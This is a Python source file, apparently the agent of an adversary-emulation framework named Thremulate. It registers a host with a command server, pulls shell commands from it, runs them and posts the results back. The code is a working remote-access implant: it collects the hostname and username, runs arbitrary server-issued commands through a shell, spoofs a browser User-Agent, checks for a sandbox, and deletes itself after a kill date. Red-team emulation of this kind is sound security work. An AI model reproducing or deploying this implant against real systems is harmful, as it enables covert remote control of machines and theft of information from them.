import configparser
import datetime
import sys
from getpass import getuser
import os
import platform
import subprocess
import time
import urllib3
from random import randrange
from pathlib import Path

from urllib3.exceptions import MaxRetryError

urllib3.disable_warnings()
http = urllib3.PoolManager(ca_certs='thremulate.crt')
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                         ' (KHTML, like Gecko) Chrome/78.0.3904.97 Safa'}
TIMEOUT = 15
executed = []
agent_id = 0
kill_date_string = ''
THIS_DIR = Path(__file__).parent


def check_cert():
    if not os.path.exists(path=THIS_DIR / 'thremulate.crt'):
        certificate = b"""
-----BEGIN CERTIFICATE-----
MIIC8DCCAdigAwIBAgIURbRyjExMFO4ZWcA9A3kOsxMojswwDQYJKoZIhvcNAQEL
BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTIwMDEyNzE2NTIwN1oXDTMwMDEy
NDE2NTIwN1owFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
AAOCAQ8AMIIBCgKCAQEAvbIA0b7znei4rAdTAlk3phm5SdvI6+7JzTE7w+14anoH
pXcD/nPzgenV722i/Bp19OpJ80qdfP6uHa+11tVqWXxqG843wTJ9u4c1VhMLf9ju
XBXJGBl2Ud+jOLgmJtYgKOE9Km88AbT84kQMkao15ySy94tfL8dSA27hFvfrrvzp
YTzDYXbyMzsf61LBWnGXAcWau20j5w3+UYjxARWJuMswpaaupd0miBMGpGZBgPqw
E7oQE6rTXk+n0jKuE+nUONQqPk8N4R/CbZ6Pk3wZHZOgM2bKSCxKvI2va66MEuIk
nZhpm02wyDm7vF8pxsmdlDa41txFtSFLSahjJ+AUXQIDAQABozowODAPBgNVHRME
CDAGAQH/AgEAMCUGA1UdEQQeMByCCWxvY2FsaG9zdIIJMTI3LjAuMC4xhwR/AAAB
MA0GCSqGSIb3DQEBCwUAA4IBAQBtTSub5ioRpVqWWjYxZYtkSRgWa3/CwH957ngR
PWsKEbjr5dynaFhJI6DTOfOF42q9njBvaLK1baGB4K7TgfMyPiozWVR8wicthmuY
s/5ewV1ZWax1LMpVATERanzo/t5knhCNRegkYUL1eQqI1rAtUZF9jJ84q1a4ONwN
TKiGpUrVqVXFNopyF60vC8koO2LqKXqxdlhlArZml/a2gLFb9F+yVIimx4eKAtS0
x3MOEQiUgH8ha4wvJpsr/WzD0EBcyPop6MogvgSP+hzJ0N0wb+A//cNsuTIZAUZ8
X4E1Yf/YLC8FZCgjz3Z9NUltZ6MNuahcJPfeVhd47cg9lK8o
-----END CERTIFICATE-----
        """
        with open("thremulate.crt", "wb") as f:
            f.write(certificate)


def config_file():
    config = configparser.ConfigParser()
    global agent_id

    # When operator sets a kill date, kill_date_string will not be 'None'
    # None was converted to a string. Do not remove it.
    if kill_date_string != 'None' and \
            isinstance(datetime.datetime.strptime(kill_date_string, '%Y-%m-%d %H:%M:%S'), datetime.datetime):

        config.read('config.ini')
        if 'kill_date' in config['AGENT']:

            # Check if current kill date is different from the one stored so that we change it
            if config['AGENT']['kill_date'] != kill_date_string:
                print('[+] Agent received new kill date')
                print('[+] %s' % kill_date_string)
                config['AGENT'] = {'id': agent_id,
                                   'kill_date': kill_date_string}
                with open('config.ini', 'w') as configfile:
                    config.write(configfile)
        else:
            config['AGENT'] = {'id': agent_id,
                               'kill_date': kill_date_string}
            with open('config.ini', 'w') as configfile:
                config.write(configfile)

    # First time to run
    if not os.path.exists(path=THIS_DIR / 'config.ini'):
        config['AGENT'] = {'id': agent_id}
        with open('config.ini', 'w') as configfile:
            config.write(configfile)

    # Other runs
    else:
        config.read('config.ini')
        if 'kill_date' in config['AGENT']:
            if kill_date_string == 'None':
                config['AGENT'] = {'id': agent_id}
                with open('config.ini', 'w') as configfile:
                    config.write(configfile)
                    return

            confirm_kill()


def execute_command(command_issued):
    cmd = subprocess.Popen(command_issued, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.PIPE)
    executed.append(datetime.datetime.now())
    try:
        success, error = cmd.communicate(timeout=TIMEOUT)
    except subprocess.TimeoutExpired:
        cmd.kill()
        success, error = cmd.communicate()

    success = success.decode("utf-8")
    error = error.decode("utf-8")

    if error is not '':
        return 'Error--' + error

    if success == '' or success != '':
        return 'Success--' + success


def get_platform():
    # We need to handle the platform a bit differently in certain cases.
    # Otherwise, we simply return the value that's given here.
    plat = platform.system().lower()

    if plat == "darwin":
        # 'macos' is the term that is being used within the .yaml files.
        plat = "macos"

    return plat


def register():
    url = 'https://localhost:8000/register_agent'

    try:
        req = http.request('POST', url, fields={'id': agent_id, 'hostname': platform.node(), 'platform': get_platform(),
                                                'plat_version': platform.version(),
                                                'username': getuser()}, headers=headers)
        response = str(req.data.decode('utf-8'))

        if req.status == 200:
            print('[+] ' + response)

    except MaxRetryError:
        sys.exit('[+] Agent failed to register with server after 3 retries\n[+] Agent stopped!!')


def get_techniques():
    try:

        url = ('https://localhost:8000/agent_techniques/%s' % agent_id)
        req = http.request('GET', url, headers=headers)
        response = str(req.data.decode('utf-8'))

        if req.status == 200:
            if response == '':
                return ''
            response = response.split(',')
            result = []

            for res in response:
                if res is not '':
                    result.append(res)

            return result
        return

    except MaxRetryError:
        print('[+] Agent failed to contact server for techniques assigned after 3 retries')
        pass


def download_and_run_commands():
    try:
        url = ('https://localhost:8000/agent_tasks/%s' % agent_id)
        req = http.request('GET', url, headers=headers)
        response = str(req.data.decode('utf-8'))

        if req.status == 200:
            results = []
            agent_commands = response.split(';')

            for i, command in enumerate(agent_commands):
                if command is '':
                    continue
                if i == 0:
                    global kill_date_string
                    kill_date_string = command
                    continue

                results.append(execute_command(command))

            return results
        return
    except MaxRetryError:
        print('[+] Agent failed to contact server for tasks to execute after 3 retries')
        pass


def send_output():
    std_out = download_and_run_commands()
    # url = 'https://localhost:8000/agent_tasks/5'

    if std_out is None:
        print('[+] Failed to get techniques from the server')
        return
    if len(std_out) == 0:
        # print('[+] No techniques assigned')
        return

    agent_tech = get_techniques()
    # https://localhost:8000/agent_techniques/5

    if agent_tech is None:
        # print('[+] Failed to get techniques from the server')
        return
    if agent_tech == '':
        print('[+] No techniques assigned')
        return

    url = 'https://localhost:8000/agent_output'

    # Iterates over list of techniques assigned to an agent_tasks while selecting the respective
    # result or output after executing that technique
    for i, res in enumerate(agent_tech):
        try:

            req = http.request('POST', url, fields={'id': agent_id, 'tech': agent_tech[i], 'output': std_out[i],
                                                    'executed': ('%s' % executed[i])}, headers=headers)

            if req.status == 200:
                print('[+] Agent executed T%s' % agent_tech[i])

            # time.sleep(4)

        except IndexError:
            print('Index error for %d' % i)
            pass
        except MaxRetryError:
            print('[+] Agent failed to send T%s execution results to server after 3 retries' % str(agent_tech[i]))
            pass


def confirm_kill():
    global kill_date_string
    if kill_date_string == '':
        check = configparser.ConfigParser()
        check.read('config.ini')

        if 'kill_date' in check['AGENT']:
            kill_date_string = check['AGENT']['kill_date']

    if kill_date_string == '':
        return

    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    if now > kill_date_string:
        path = Path(__file__)
        os.remove(path)

        if os.path.exists(path=THIS_DIR / 'config.ini'):
            os.remove(THIS_DIR / 'config.ini')


# def form():
#     url = 'https://localhost:8000/campaign_delete'
#
#     req = http.request('POST', url, fields={'id': 6}, headers=headers)
#     response = str(req.data.decode('utf-8'))
#     print('Response code: ' + str(req.status))
#     print('Response: ' + response)

def sandbox_evasion():
    # SANDBOX 1 :Check number of CPU core
    if os.cpu_count() >= 2:
        # Get the current time
        now = datetime.datetime.now()
        # Stop code execution for 1 seconds
        time.sleep(2)
        # Get the time after 2 seconds
        now2 = datetime.datetime.now()
        # SANDBOX 2 :Check if AV skipped sleep function
        if (now2 - now) > datetime.timedelta(seconds=1):
            print('Run')
        else:
            print('Sandbox')


if __name__ == '__main__':
    print('Agent running')
    sandbox_evasion()
    check_cert()
    http = urllib3.PoolManager(ca_certs='thremulate.crt')
    # Agent obtaining ID and kill date if any.
    if not os.path.exists(path=THIS_DIR / 'config.ini'):
        agent_id = randrange(500)
        register()
    else:
        agent_config = configparser.ConfigParser()
        agent_config.read('config.ini')
        try:
            agent_id = agent_config['AGENT']['id']
            print('[+] Agent already registered')
        except KeyError:
            sys.exit('[+] Agent has no ID in config.ini\n[+] Agent Stopped!!')
        try:
            kill_date_string = agent_config['AGENT']['kill_date']
        except KeyError:
            pass
    while True:
        time.sleep(4)
        send_output()
        config_file()
